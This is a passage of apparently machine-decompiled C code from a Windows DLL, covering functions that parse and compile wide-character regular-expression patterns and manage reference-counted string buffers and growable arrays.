          iVar2 = param_1[4] + uVar4 * 8;
          *(int *)(iVar2 + 4) = param_2 + (*(int *)(iVar2 + 4) - param_3 >> 1) * 2;
        }
        uVar4 = uVar4 + 1;
      } while (uVar4 < *param_1);
    }
    return;
  }
  FUN_10007f20(0x80004005);
  pcVar3 = (code *)swi(3);
  (*pcVar3)();
  return;
}



/* Function: FUN_1000f2c0 */

undefined4 __thiscall FUN_1000f2c0(int *param_1,int param_2,int param_3)

{
  char cVar1;
  
  param_1[9] = 0;
  *param_1 = 0;
  thunk_FUN_100579ee(param_1[4]);
  param_1[4] = 0;
  cVar1 = FUN_1000f5e0(param_3);
  if (cVar1 != '\0') {
    *param_1 = param_3;
    thunk_FUN_100579ee(param_1[3]);
    param_1[3] = 0;
    cVar1 = FUN_1000f430(param_2);
    if (cVar1 != '\0') {
      FUN_1005ff60(param_1[3],0,param_2 << 2);
      FUN_1005ff60(param_1[4],0,*param_1 << 3);
      return 1;
    }
  }
  return 0;
}



/* Function: FUN_1000f360 */

undefined4 __thiscall FUN_1000f360(int param_1,undefined4 param_2)

{
  uint uVar1;
  code *pcVar2;
  char cVar3;
  undefined4 uVar4;
  
  *(int *)(param_1 + 0x24) = *(int *)(param_1 + 0x24) + 1;
  if (*(uint *)(param_1 + 0x24) < *(uint *)(param_1 + 0x18)) goto LAB_1000f3b3;
  uVar1 = *(uint *)(param_1 + 0x24) * 2 + 2;
  if (uVar1 == 0) {
    if (*(int *)(param_1 + 0x14) != 0) {
      FUN_100579ee(*(int *)(param_1 + 0x14));
      *(undefined4 *)(param_1 + 0x14) = 0;
    }
    *(undefined4 *)(param_1 + 0x18) = 0;
    *(undefined4 *)(param_1 + 0x1c) = 0;
    goto LAB_1000f3b3;
  }
  if (*(uint *)(param_1 + 0x1c) < uVar1) {
    cVar3 = FUN_10010600(uVar1);
    if (cVar3 == '\0') {
      *(int *)(param_1 + 0x24) = *(int *)(param_1 + 0x24) + -1;
      return 0;
    }
LAB_1000f3ab:
    FUN_10006250();
  }
  else if (*(uint *)(param_1 + 0x18) < uVar1) goto LAB_1000f3ab;
  *(uint *)(param_1 + 0x18) = uVar1;
LAB_1000f3b3:
  if (*(uint *)(param_1 + 0x18) <= *(uint *)(param_1 + 0x24)) {
    FUN_10007f20(0x80070057);
    pcVar2 = (code *)swi(3);
    uVar4 = (*pcVar2)();
    return uVar4;
  }
  *(undefined4 *)(*(int *)(param_1 + 0x14) + *(uint *)(param_1 + 0x24) * 4) = param_2;
  return 1;
}



/* Function: FUN_1000f400 */

undefined4 __fastcall FUN_1000f400(int param_1)

{
  uint uVar1;
  code *pcVar2;
  undefined4 uVar3;
  
  uVar1 = *(uint *)(param_1 + 0x24);
  if (uVar1 == 0) {
    return 0;
  }
  if (uVar1 < *(uint *)(param_1 + 0x18)) {
    uVar3 = *(undefined4 *)(*(int *)(param_1 + 0x14) + uVar1 * 4);
    *(uint *)(param_1 + 0x24) = uVar1 - 1;
    return uVar3;
  }
  FUN_10007f20(0x80070057);
  pcVar2 = (code *)swi(3);
  uVar3 = (*pcVar2)();
  return uVar3;
}



/* Function: FUN_1000f430 */

bool __thiscall FUN_1000f430(int *param_1,uint param_2)

{
  int iVar1;
  
  iVar1 = FUN_100582f1(-(uint)((int)((ulonglong)param_2 * 4 >> 0x20) != 0) |
                       (uint)((ulonglong)param_2 * 4),&DAT_10098020);
  *param_1 = iVar1;
  return iVar1 != 0;
}



/* Function: FUN_1000f470 */

int __thiscall FUN_1000f470(int *param_1,undefined4 *param_2,byte *param_3)

{
  undefined4 uVar1;
  code *pcVar2;
  undefined4 *puVar3;
  int iVar4;
  uint uVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  
  puVar3 = param_2;
  uVar1 = *param_2;
  iVar4 = FUN_1000f110(0xe);
  if (-1 < iVar4) {
    uVar5 = FUN_1000f110(0x10);
    if (-1 < (int)uVar5) {
      if ((uint)param_1[2] <= uVar5) {
        FUN_10007f20(0x80070057);
        pcVar2 = (code *)swi(3);
        iVar4 = (*pcVar2)();
        return iVar4;
      }
      *(int *)(param_1[1] + 4 + uVar5 * 8) = iVar4 + 4;
      iVar6 = FUN_1000f110(0xf);
      if (-1 < iVar6) {
        iVar6 = FUN_1000f110(0xd);
        if (-1 < iVar6) {
          iVar7 = FUN_1000f620(puVar3,param_3);
          if (iVar7 < 0) {
            if (*param_1 == 0) {
              FUN_1000f990(param_1);
              return iVar7;
            }
          }
          else {
            iVar7 = FUN_1000f110(0xd);
            if (-1 < iVar7) {
              iVar8 = FUN_1000f1a0(iVar6);
              *(int *)(iVar8 + 4) = iVar7 + 1;
              if (*(short *)*puVar3 != 0x7c) {
                FUN_1000f990(param_1);
                *puVar3 = uVar1;
                iVar4 = FUN_1000f620(puVar3,param_3);
                return iVar4;
              }
              *puVar3 = (short *)*puVar3 + 1;
              iVar9 = FUN_1000f470(puVar3,(int)&param_2 + 3);
              iVar8 = param_1[2];
              iVar7 = FUN_1000f1a0(iVar7);
              *(int *)(iVar7 + 4) = iVar8;
              iVar6 = FUN_1000f1a0(iVar6);
              *(int *)(iVar6 + 4) = iVar9;
              if (-1 < iVar9) {
                *param_3 = *param_3 | param_2._3_1_;
                return iVar4;
              }
              if (*param_1 == 0) {
                FUN_1000f990(param_1);
                return iVar9;
              }
            }
          }
        }
      }
    }
  }
  return -1;
}



/* Function: FUN_1000f5e0 */

bool __thiscall FUN_1000f5e0(int *param_1,uint param_2)

{
  int iVar1;
  
  iVar1 = FUN_100582f1(-(uint)((int)((ulonglong)param_2 * 8 >> 0x20) != 0) |
                       (uint)((ulonglong)param_2 * 8),&DAT_10098020);
  *param_1 = iVar1;
  return iVar1 != 0;
}



/* Function: FUN_1000f620 */

int __thiscall FUN_1000f620(undefined4 *param_1,int *param_2,char *param_3)

{
  short sVar1;
  undefined4 uVar2;
  short *psVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  int iVar10;
  int iVar11;
  
  uVar2 = param_1[5];
  iVar5 = *param_2;
  iVar4 = FUN_1000fa40(param_2,param_3);
  if (iVar4 < 0) {
    return iVar4;
  }
  psVar3 = (short *)*param_2;
  sVar1 = *psVar3;
  if (sVar1 == 0x2a) {
    *param_2 = (int)(psVar3 + 1);
    if (psVar3[1] == 0x3f) {
      iVar11 = 0x13;
      *param_2 = (int)(psVar3 + 2);
    }
    else {
      iVar11 = 0x12;
    }
LAB_1000f6d3:
    FUN_1000f990(param_1);
  }
  else {
    if (sVar1 != 0x2b) {
      if (sVar1 != 0x3f) {
        return iVar4;
      }
      *param_2 = (int)(psVar3 + 1);
      if (psVar3[1] == 0x3f) {
        iVar11 = 0xc;
        *param_2 = (int)(psVar3 + 2);
      }
      else {
        iVar11 = 0xb;
      }
      goto LAB_1000f6d3;
    }
    *param_2 = (int)(psVar3 + 1);
    if (psVar3[1] == 0x3f) {
      iVar11 = 10;
      *param_2 = (int)(psVar3 + 2);
      param_1[5] = uVar2;
    }
    else {
      iVar11 = 9;
      param_1[5] = uVar2;
    }
  }
  *param_2 = iVar5;
  if (((iVar11 == 0x13) || (iVar11 == 10)) || (iVar11 == 0xc)) {
    iVar5 = FUN_1000f110(0x10);
    if (iVar5 < 0) {
      return -1;
    }
    *param_3 = '\0';
    iVar6 = FUN_1000fa40(param_2,param_3);
    if (iVar6 < 0) {
      return iVar6;
    }
    if ((*param_3 == '\0') || ((iVar11 != 0x13 && (iVar11 != 10)))) {
      *param_2 = *param_2 + 4;
      *param_3 = '\x01';
      if ((iVar11 != 0x13) && (iVar11 != 10)) {
        iVar7 = FUN_1000f1a0(iVar5);
        *(int *)(iVar7 + 4) = iVar6 + 1;
        if (iVar11 == 10) {
          iVar5 = iVar4;
        }
        return iVar5;
      }
      iVar6 = FUN_1000f110(0xd);
      if (iVar6 < 0) {
        return -1;
      }
      iVar7 = FUN_1000f1a0(iVar5);
      *(int *)(iVar7 + 4) = iVar6 + 1;
      iVar6 = FUN_1000f1a0(iVar6);
      *(int *)(iVar6 + 4) = iVar5;
      if (iVar11 == 10) {
        iVar5 = iVar4;
      }
      return iVar5;
    }
LAB_1000f809:
    *param_1 = 9;
    return -1;
  }
  iVar5 = FUN_1000f110(0x14);
  if (iVar5 < 0) {
    return -1;
  }
  iVar6 = FUN_1000f110(0x16);
  if (iVar6 < 0) {
    return -1;
  }
  iVar7 = FUN_1000f110(0xe);
  if (iVar7 < 0) {
    return -1;
  }
  iVar7 = FUN_1000f110(0x10);
  if (iVar7 < 0) {
    return -1;
  }
  iVar8 = FUN_1000f110(0xf);
  if (iVar8 < 0) {
    return -1;
  }
  iVar8 = FUN_1000f110(0x15);
  if (iVar8 < 0) {
    return -1;
  }
  iVar9 = FUN_1000f110(0xd);
  if (iVar9 < 0) {
    return -1;
  }
  iVar10 = FUN_1000f1a0(iVar5);
  *(undefined4 *)(iVar10 + 4) = param_1[6];
  param_1[6] = param_1[6] + 1;
  iVar10 = FUN_1000f1a0(iVar5);
  iVar6 = FUN_1000f1a0(iVar6);
  *(undefined4 *)(iVar6 + 4) = *(undefined4 *)(iVar10 + 4);
  iVar6 = FUN_1000f1a0(iVar7);
  *(int *)(iVar6 + 4) = iVar9 + 1;
  iVar6 = FUN_1000f1a0(iVar5);
  iVar7 = FUN_1000f1a0(iVar8);
  *(undefined4 *)(iVar7 + 4) = *(undefined4 *)(iVar6 + 4);
  *param_3 = '\0';
  iVar6 = FUN_1000fa40(param_2,param_3);
  if (iVar6 < 0) {
    return iVar6;
  }
  if (*param_3 == '\0') {
    if (iVar11 == 9) goto LAB_1000f823;
  }
  else if ((iVar11 == 0x12) || (iVar11 == 9)) goto LAB_1000f809;
  *param_3 = '\x01';
LAB_1000f823:
  *param_2 = *param_2 + 2;
  iVar6 = FUN_1000f110(0x1a);
  if ((-1 < iVar6) && (iVar7 = FUN_1000f110(0x16), -1 < iVar7)) {
    iVar8 = FUN_1000f1a0(iVar5);
    iVar6 = FUN_1000f1a0(iVar6);
    *(undefined4 *)(iVar6 + 4) = *(undefined4 *)(iVar8 + 4);
    iVar6 = FUN_1000f1a0(iVar5);
    iVar7 = FUN_1000f1a0(iVar7);
    *(undefined4 *)(iVar7 + 4) = *(undefined4 *)(iVar6 + 4);
    if (iVar11 != 0xb) {
      iVar6 = FUN_1000f110(0xd);
      if (iVar6 < 0) {
        return -1;
      }
      iVar6 = FUN_1000f1a0(iVar6);
      *(int *)(iVar6 + 4) = iVar5;
    }
    uVar2 = param_1[2];
    iVar6 = FUN_1000f1a0(iVar9);
    *(undefined4 *)(iVar6 + 4) = uVar2;
    if (iVar11 == 9) {
      iVar5 = iVar4;
    }
    return iVar5;
  }
  return -1;
}



/* Function: FUN_1000f990 */

void __thiscall FUN_1000f990(uint *param_1,int param_2)

{
  uint uVar1;
  char cVar2;
  
  uVar1 = *param_1;
  if (uVar1 == 0) {
    if (*(int *)(param_2 + 4) != 0) {
      FUN_100579ee(*(int *)(param_2 + 4));
      *(undefined4 *)(param_2 + 4) = 0;
    }
    *(undefined4 *)(param_2 + 8) = 0;
    *(undefined4 *)(param_2 + 0xc) = 0;
    goto LAB_1000f9e5;
  }
  if (*(uint *)(param_2 + 0xc) < uVar1) {
    cVar2 = FUN_10013ef0(uVar1);
    if (cVar2 == '\0') goto LAB_1000f9e5;
LAB_1000f9dd:
    FUN_10006250();
  }
  else if (*(uint *)(param_2 + 8) < uVar1) goto LAB_1000f9dd;
  *(uint *)(param_2 + 8) = uVar1;
LAB_1000f9e5:
  *(uint *)(param_2 + 0x14) = param_1[1];
  *(uint *)(param_2 + 0x18) = param_1[2];
  return;
}



/* Function: FUN_1000fa00 */

void FUN_1000fa00(int *param_1,int *param_2)

{
  code *pcVar1;
  int *piVar2;
  
  piVar2 = (int *)FUN_100582fa(0xc);
  if (piVar2 == (int *)0x0) {
    FUN_10056a39();
    pcVar1 = (code *)swi(3);
    (*pcVar1)();
    return;
  }
  if (param_1 == (int *)0x0) {
    param_1 = piVar2;
    param_2 = piVar2;
  }
  *piVar2 = (int)param_1;
  if (piVar2 + 1 != (int *)0x0) {
    piVar2[1] = (int)param_2;
  }
  return;
}



/* Function: FUN_1000fa40 */

int __thiscall FUN_1000fa40(int *param_1,wchar_t **param_2,undefined1 *param_3)

{
  wchar_t wVar1;
  wchar_t *pwVar2;
  int iVar3;
  int iVar4;
  uint uVar5;
  
  pwVar2 = *param_2;
  wVar1 = *pwVar2;
  if (wVar1 == L'{') {
    *param_2 = pwVar2 + 1;
    iVar3 = FUN_1000fc20(param_2,param_3);
    return iVar3;
  }
  if (wVar1 == L'(') {
    *param_2 = pwVar2 + 1;
    iVar3 = FUN_1000fdb0(param_2,param_3);
    return iVar3;
  }
  if (wVar1 == L'[') {
    *param_2 = pwVar2 + 1;
    iVar3 = FUN_1000fe50(param_2,param_3);
    return iVar3;
  }
  if (wVar1 == L'\\') {
    *param_2 = pwVar2 + 1;
    iVar3 = FUN_10058dd6(pwVar2[1]);
    if (iVar3 == 0) {
      iVar3 = FUN_100100a0(param_2,param_3);
      if (-1 < iVar3) {
        return iVar3;
      }
      if ((*param_1 == 0) && (iVar3 = FUN_1000f110(3), -1 < iVar3)) {
        wVar1 = **param_2;
        iVar4 = FUN_1000f1a0(iVar3);
        *(uint *)(iVar4 + 4) = (uint)(ushort)wVar1;
        *param_2 = *param_2 + 1;
        return iVar3;
      }
    }
    else {
      *param_3 = 0;
      iVar3 = FUN_1000f110(0x1b);
      if (-1 < iVar3) {
        uVar5 = _wcstol(*param_2,param_2,10);
        if (uVar5 < (uint)param_1[5]) {
          iVar4 = FUN_1000f1a0(iVar3);
          *(uint *)(iVar4 + 4) = uVar5;
          return iVar3;
        }
        *param_1 = 7;
      }
    }
  }
  else {
    if (wVar1 == L'!') {
      *param_2 = pwVar2 + 1;
      iVar3 = FUN_1000fed0(param_2,param_3);
      return iVar3;
    }
    if ((((wVar1 != L'}') && (wVar1 != L']')) && (wVar1 != L')')) && (wVar1 != L'\0')) {
      if (wVar1 == L'.') {
        iVar3 = FUN_1000f110(4);
        if (-1 < iVar3) {
          *param_2 = *param_2 + 1;
          *param_3 = 0;
          return iVar3;
        }
      }
      else if ((wVar1 == L'$') && (pwVar2[1] == L'\0')) {
        iVar3 = FUN_1000f110(3);
        if (-1 < iVar3) {
          iVar4 = FUN_1000f1a0(iVar3);
          *(undefined4 *)(iVar4 + 4) = 0;
          *param_2 = *param_2 + 1;
          *param_3 = 0;
          return iVar3;
        }
      }
      else {
        iVar3 = FUN_1000f110(3);
        if (-1 < iVar3) {
          wVar1 = **param_2;
          iVar4 = FUN_1000f1a0(iVar3);
          *(uint *)(iVar4 + 4) = (uint)(ushort)wVar1;
          *param_2 = *param_2 + 1;
          *param_3 = 0;
          return iVar3;
        }
      }
    }
  }
  return -1;
}



/* Function: FUN_1000fc20 */

uint __thiscall FUN_1000fc20(int *param_1,undefined4 *param_2,undefined4 param_3)

{
  code *pcVar1;
  uint uVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  int iVar6;
  
  uVar2 = FUN_1000f110(0x1f);
  if ((int)uVar2 < 0) {
    return 0xffffffff;
  }
  if (uVar2 < (uint)param_1[2]) {
    *(int *)(param_1[1] + 4 + uVar2 * 8) = param_1[5];
    uVar3 = FUN_1000f110(1);
    if ((int)uVar3 < 0) {
      return 0xffffffff;
    }
    if ((uint)param_1[2] <= uVar3) goto LAB_1000fd82;
    *(int *)(param_1[1] + 4 + uVar3 * 8) = param_1[5];
    param_1[5] = param_1[5] + 1;
    iVar4 = FUN_1000f110(0x10);
    if (iVar4 < 0) {
      return 0xffffffff;
    }
    uVar5 = FUN_1000f110(0x20);
    if ((int)uVar5 < 0) {
      return 0xffffffff;
    }
    if (uVar2 < (uint)param_1[2]) {
      if (uVar5 < (uint)param_1[2]) {
        *(undefined4 *)(param_1[1] + 4 + uVar5 * 8) = *(undefined4 *)(param_1[1] + 4 + uVar2 * 8);
        iVar6 = FUN_1000f110(0x11);
        if (iVar6 < 0) {
          return 0xffffffff;
        }
        iVar6 = FUN_1000f1c0(param_2,param_3);
        if (iVar6 < 0) {
          if (*param_1 != 0) {
            return 0xffffffff;
          }
          if (*(short *)*param_2 != 0x7d) goto LAB_1000fd66;
          iVar6 = FUN_1000f110(0);
          if (iVar6 < 0) {
            return 0xffffffff;
          }
        }
        iVar4 = FUN_1000f1a0(iVar4);
        *(int *)(iVar4 + 4) = iVar6;
        if (*(short *)*param_2 == 0x7d) {
          *param_2 = (short *)*param_2 + 1;
          iVar4 = FUN_1000f110(2);
          if (iVar4 < 0) {
            return 0xffffffff;
          }
          iVar6 = FUN_1000f1a0(uVar3);
          iVar4 = FUN_1000f1a0(iVar4);
          *(undefined4 *)(iVar4 + 4) = *(undefined4 *)(iVar6 + 4);
          return uVar2;
        }
LAB_1000fd66:
        *param_1 = 2;
        return 0xffffffff;
      }
      goto LAB_1000fd96;
    }
  }
  else {
    FUN_10007f20(0x80070057);
LAB_1000fd82:
    FUN_10007f20(0x80070057);
  }
  FUN_10007f20(0x80070057);
LAB_1000fd96:
  FUN_10007f20(0x80070057);
  pcVar1 = (code *)swi(3);
  uVar2 = (*pcVar1)();
  return uVar2;
}



/* Function: FUN_1000fdb0 */

uint __thiscall FUN_1000fdb0(int *param_1,undefined4 *param_2,undefined4 param_3)

{
  code *pcVar1;
  uint uVar2;
  int iVar3;
  
  uVar2 = FUN_1000f110(0x10);
  if ((int)uVar2 < 0) {
    return 0xffffffff;
  }
  iVar3 = FUN_1000f110(0x11);
  if (iVar3 < 0) {
    return 0xffffffff;
  }
  iVar3 = FUN_1000f1c0(param_2,param_3);
  if (iVar3 < 0) {
    if (*param_1 != 0) {
      return 0xffffffff;
    }
    if (*(short *)*param_2 != 0x29) goto LAB_1000fe2d;
    iVar3 = FUN_1000f110(0);
    if (iVar3 < 0) {
      return 0xffffffff;
    }
  }
  if ((uint)param_1[2] <= uVar2) {
    FUN_10007f20(0x80070057);
    pcVar1 = (code *)swi(3);
    uVar2 = (*pcVar1)();
    return uVar2;
  }
  *(int *)(param_1[1] + 4 + uVar2 * 8) = iVar3;
  if (*(short *)*param_2 == 0x29) {
    *param_2 = (short *)*param_2 + 1;
    return uVar2;
  }
LAB_1000fe2d:
  *param_1 = 3;
  return 0xffffffff;
}



/* Function: FUN_1000fe50 */

int __thiscall FUN_1000fe50(undefined4 *param_1,undefined4 *param_2,undefined1 *param_3)

{
  short sVar1;
  short *psVar2;
  int iVar3;
  
  *param_3 = 0;
  psVar2 = (short *)*param_2;
  sVar1 = *psVar2;
  if (sVar1 != 0x5d) {
    if (sVar1 == 0x5e) {
      *param_2 = psVar2 + 1;
    }
    psVar2 = (short *)*param_2;
    if (*psVar2 != 0x5d) {
      iVar3 = FUN_10010110(param_2,sVar1 == 0x5e);
      if (-1 < iVar3) {
        if (*(short *)*param_2 != 0x5d) {
          *param_1 = 4;
          return -1;
        }
        *param_2 = (short *)*param_2 + 1;
      }
      return iVar3;
    }
  }
  *param_2 = psVar2 + 1;
  *param_1 = 6;
  return -1;
}



/* Function: FUN_1000fed0 */

uint __thiscall FUN_1000fed0(int param_1,undefined4 param_2,undefined4 param_3)

{
  code *pcVar1;
  uint uVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  int iVar6;
  int iVar7;
  
  uVar2 = FUN_1000f110(0x16);
  if ((int)uVar2 < 0) {
LAB_1000fefe:
    uVar3 = FUN_1000f110(0x17);
    if (-1 < (int)uVar3) {
      if (*(uint *)(param_1 + 8) <= uVar3) goto LAB_1001006c;
      *(undefined4 *)(*(int *)(param_1 + 4) + 4 + uVar3 * 8) = *(undefined4 *)(param_1 + 0x18);
      *(int *)(param_1 + 0x18) = *(int *)(param_1 + 0x18) + 1;
    }
    iVar4 = FUN_1000f110(0x10);
    if (iVar4 < 0) {
      return 0xffffffff;
    }
    uVar5 = FUN_1000f110(0x18);
    if ((int)uVar5 < 0) {
      return 0xffffffff;
    }
    if (*(uint *)(param_1 + 8) <= uVar2) goto LAB_10010076;
    if (*(uint *)(param_1 + 8) <= uVar5) goto LAB_10010080;
    *(undefined4 *)(*(int *)(param_1 + 4) + 4 + uVar5 * 8) =
         *(undefined4 *)(*(int *)(param_1 + 4) + uVar2 * 8 + 4);
    uVar5 = FUN_1000f110(0x19);
    if ((int)uVar5 < 0) {
      return 0xffffffff;
    }
    if (uVar3 < *(uint *)(param_1 + 8)) {
      if (uVar5 < *(uint *)(param_1 + 8)) {
        *(undefined4 *)(*(int *)(param_1 + 4) + 4 + uVar5 * 8) =
             *(undefined4 *)(*(int *)(param_1 + 4) + uVar3 * 8 + 4);
        iVar6 = FUN_1000f110(0xd);
        if (iVar6 < 0) {
          return 0xffffffff;
        }
        uVar5 = FUN_1000fa40(param_2,param_3);
        if ((int)uVar5 < 0) {
          return uVar5;
        }
        iVar4 = FUN_1000f1a0(iVar4);
        *(uint *)(iVar4 + 4) = uVar5;
        iVar4 = FUN_1000f110(0x18);
        if (iVar4 < 0) {
          return 0xffffffff;
        }
        iVar7 = FUN_1000f1a0(uVar2);
        iVar4 = FUN_1000f1a0(iVar4);
        *(undefined4 *)(iVar4 + 4) = *(undefined4 *)(iVar7 + 4);
        iVar4 = FUN_1000f110(0x19);
        if (iVar4 < 0) {
          return 0xffffffff;
        }
        iVar7 = FUN_1000f1a0(uVar3);
        iVar4 = FUN_1000f1a0(iVar4);
        *(undefined4 *)(iVar4 + 4) = *(undefined4 *)(iVar7 + 4);
        iVar4 = FUN_1000f110(0x11);
        if (iVar4 < 0) {
          return 0xffffffff;
        }
        iVar6 = FUN_1000f1a0(iVar6);
        *(int *)(iVar6 + 4) = iVar4 + 1;
        return uVar2;
      }
      goto LAB_10010094;
    }
  }
  else {
    if (uVar2 < *(uint *)(param_1 + 8)) {
      *(undefined4 *)(*(int *)(param_1 + 4) + 4 + uVar2 * 8) = *(undefined4 *)(param_1 + 0x18);
      *(int *)(param_1 + 0x18) = *(int *)(param_1 + 0x18) + 1;
      goto LAB_1000fefe;
    }
    FUN_10007f20(0x80070057);
LAB_1001006c:
    FUN_10007f20(0x80070057);
LAB_10010076:
    FUN_10007f20(0x80070057);
LAB_10010080:
    FUN_10007f20(0x80070057);
  }
  FUN_10007f20(0x80070057);
LAB_10010094:
  FUN_10007f20(0x80070057);
  pcVar1 = (code *)swi(3);
  uVar2 = (*pcVar1)();
  return uVar2;
}



/* Function: FUN_100100a0 */

int __thiscall FUN_100100a0(undefined4 *param_1,int *param_2,undefined4 param_3)

{
  int *piVar1;
  int iVar2;
  short *psVar3;
  undefined **ppuVar4;
  
  piVar1 = param_2;
  ppuVar4 = &PTR_u_a__a_zA_Z0_9___10096620;
  if (PTR_u_a__a_zA_Z0_9___10096620 != (undefined *)0x0) {
    psVar3 = (short *)PTR_u_a__a_zA_Z0_9___10096620;
    do {
      if (*(short *)*param_2 == *psVar3) {
        param_2 = (int *)(*ppuVar4 + 2);
        iVar2 = FUN_1000f620(&param_2,param_3);
        if (iVar2 < 0) {
          *param_1 = 5;
          return iVar2;
        }
        *piVar1 = *piVar1 + 2;
        return iVar2;
      }
      psVar3 = (short *)ppuVar4[1];
      ppuVar4 = ppuVar4 + 1;
    } while (psVar3 != (short *)0x0);
  }
  return -1;
}



/* Function: FUN_10010110 */

uint __thiscall FUN_10010110(int param_1,undefined4 *param_2,uint param_3)

{
  code *pcVar1;
  undefined4 *puVar2;
  short sVar3;
  uint uVar4;
  int iVar5;
  uint uVar6;
  uint uVar7;
  
  uVar4 = FUN_1000f110((param_3 != 0) + '\a');
  puVar2 = param_2;
  if ((int)uVar4 < 0) {
    return 0xffffffff;
  }
  sVar3 = *(short *)*param_2;
  if (sVar3 != 0) {
    while (sVar3 != 0x5d) {
      iVar5 = FUN_100101f0(puVar2,&param_3,&param_2);
      if (((iVar5 != 0) || (uVar6 = FUN_1000f110(0), (int)uVar6 < 0)) ||
         (uVar7 = FUN_1000f110(0), (int)uVar7 < 0)) {
        return 0xffffffff;
      }
      if ((*(uint *)(param_1 + 8) <= uVar6) ||
         (*(uint *)(*(int *)(param_1 + 4) + 4 + uVar6 * 8) = param_3 & 0xffff,
         *(uint *)(param_1 + 8) <= uVar7)) goto LAB_100101db;
      *(uint *)(*(int *)(param_1 + 4) + 4 + uVar7 * 8) = (uint)param_2 & 0xffff;
      sVar3 = *(short *)*puVar2;
      if (sVar3 == 0) break;
    }
  }
  if (uVar4 < *(uint *)(param_1 + 8)) {
    *(uint *)(*(int *)(param_1 + 4) + 4 + uVar4 * 8) = *(uint *)(param_1 + 8);
    return uVar4;
  }
LAB_100101db:
  FUN_10007f20(0x80070057);
  pcVar1 = (code *)swi(3);
  uVar4 = (*pcVar1)();
  return uVar4;
}



/* Function: FUN_100101f0 */

undefined4 __thiscall FUN_100101f0(undefined4 *param_1,int *param_2,ushort *param_3,ushort *param_4)

{
  ushort *puVar1;
  short *psVar2;
  ushort uVar3;
  
  uVar3 = *(ushort *)*param_2;
  if (uVar3 == 0x5c) {
    puVar1 = (ushort *)*param_2 + 1;
    *param_2 = (int)puVar1;
    uVar3 = *puVar1;
    if (uVar3 == 0x74) {
      uVar3 = 9;
    }
  }
  *param_2 = *param_2 + 2;
  *param_3 = uVar3;
  psVar2 = (short *)*param_2;
  if (*psVar2 == 0x2d) {
    *param_2 = (int)(psVar2 + 1);
    uVar3 = psVar2[1];
    if ((uVar3 != 0) && (uVar3 != 0x5d)) {
      *param_4 = uVar3;
      *param_2 = (int)(psVar2 + 2);
      if (*param_4 < *param_3) {
        *param_1 = 8;
        return 0xffffffff;
      }
      return 0;
    }
    *param_1 = 4;
    return 0xffffffff;
  }
  *param_4 = *param_3;
  return 0;
}



/* Function: FUN_10010290 */

int * __thiscall FUN_10010290(int *param_1,uint param_2)

{
  int iVar1;
  int *piVar2;
  uint uVar3;
  uint uVar4;
  
  if (param_1 == (int *)0x0) {
    if (((param_2 != 0) && (param_2 != 0)) && (param_2 != 1)) {
      uVar3 = 0x10;
      if (0x10 < param_2) {
        uVar3 = param_2;
      }
      uVar3 = uVar3 + 0xf & 0xfffffff0;
      piVar2 = (int *)FUN_100581b4(uVar3 * 2 + 0xe);
      if (piVar2 != (int *)0x0) {
        piVar2[1] = uVar3;
        *piVar2 = 0;
        piVar2[2] = 0;
        *(undefined2 *)(piVar2 + 3) = 0;
        return piVar2;
      }
    }
    return (int *)0x0;
  }
  uVar3 = param_1[1];
  piVar2 = param_1;
  if (uVar3 < param_2) {
    if (param_2 < 0x10000) {
      if (uVar3 < 0x8000) {
        uVar4 = 1;
        if (uVar3 != 0) {
          uVar4 = uVar3;
        }
        do {
          uVar4 = uVar4 * 2;
        } while (uVar4 < param_2);
      }
      else {
        uVar4 = 0x10000;
      }
    }
    else {
      uVar4 = param_2 + 0xffff & 0xffff0000;
    }
    piVar2 = (int *)FUN_10058246(param_1,uVar4 * 2 + 0xe);
    if (piVar2 != (int *)0x0) {
      piVar2[1] = uVar4;
      return piVar2;
    }
    LOCK();
    iVar1 = *param_1;
    *param_1 = iVar1 + -1;
    UNLOCK();
    piVar2 = (int *)0x0;
    if (iVar1 + -1 < 0) {
      FUN_100579ee(param_1);
      return (int *)0x0;
    }
  }
  return piVar2;
}



/* Function: FUN_10010370 */

undefined4 * __thiscall FUN_10010370(int *param_1,uint param_2,char param_3)

{
  int iVar1;
  undefined4 *puVar2;
  uint uVar3;
  
  if ((param_1 != (int *)0x0) && (*param_1 != 0)) {
    if ((param_3 != '\0') && (param_2 < param_1[2] + 1U)) {
      param_2 = param_1[2] + 1U;
    }
    if (param_2 < 0x10000) {
      uVar3 = 0x10;
      if (0x10 < param_2) {
        uVar3 = param_2;
      }
      uVar3 = uVar3 + 0xf & 0xfffffff0;
    }
    else {
      uVar3 = param_2 + 0xffff & 0xffff0000;
    }
    puVar2 = (undefined4 *)FUN_100581b4(uVar3 * 2 + 0xe);
    if (puVar2 != (undefined4 *)0x0) {
      puVar2[1] = uVar3;
      *puVar2 = 0;
      if (param_3 == '\0') {
        puVar2[2] = 0;
        *(undefined2 *)(puVar2 + 3) = 0;
      }
      else {
        puVar2[2] = param_1[2];
        FUN_1005d740(puVar2 + 3,param_1 + 3,param_1[2] * 2 + 2);
      }
      LOCK();
      iVar1 = *param_1;
      *param_1 = iVar1 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(param_1);
      }
    }
    return puVar2;
  }
  puVar2 = (undefined4 *)FUN_10010290(param_2);
  return puVar2;
}



/* Function: FUN_10010440 */

int * __thiscall FUN_10010440(int *param_1,int *param_2)

{
  int iVar1;
  
  if (param_2 != param_1) {
    if ((param_2 == (int *)0x0) || (param_2[2] == 0)) {
      if (param_1 != (int *)0x0) {
        if (*param_1 == 0) {
          param_1[2] = 0;
          *(undefined2 *)(param_1 + 3) = 0;
          return param_1;
        }
        LOCK();
        iVar1 = *param_1;
        *param_1 = iVar1 + -1;
        UNLOCK();
        if (iVar1 + -1 < 0) {
          FUN_100579ee(param_1);
        }
      }
      return (int *)0x0;
    }
    if ((((param_1 == (int *)0x0) || (*param_1 == 0)) && (param_1 != (int *)0x0)) &&
       ((uint)param_2[2] < param_1[1] - 1U)) {
      FUN_1005d740(param_1 + 3,param_2 + 3,param_2[2] * 2 + 2);
      param_1[2] = param_2[2];
      return param_1;
    }
    LOCK();
    *param_2 = *param_2 + 1;
    UNLOCK();
    if (param_1 != (int *)0x0) {
      LOCK();
      iVar1 = *param_1;
      *param_1 = iVar1 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(param_1);
      }
    }
  }
  return param_2;
}



/* Function: FUN_10010500 */

